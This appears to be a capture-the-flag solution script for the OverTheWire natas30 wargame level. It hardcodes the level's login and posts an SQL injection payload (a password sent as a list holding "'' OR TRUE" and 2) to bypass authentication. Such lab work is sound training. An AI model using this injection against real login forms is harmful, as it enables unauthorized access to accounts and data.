import sys
import requests as req

username = "natas30"
password = "Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X"
url = "http://%s.natas.labs.overthewire.org/" % username

s = req.session()

def get(s):
	r = s.get(url, auth=(username, password))
	return r

def post(s, data):
	r = s.post(url, auth=(username, password), data=data)
	return r

if __name__ == "__main__":
	data = {"username": ["natas31"], "password": ["'' OR TRUE", 2]}
	r = post(s, data)
	print(r.text)
	print(r.request.body)
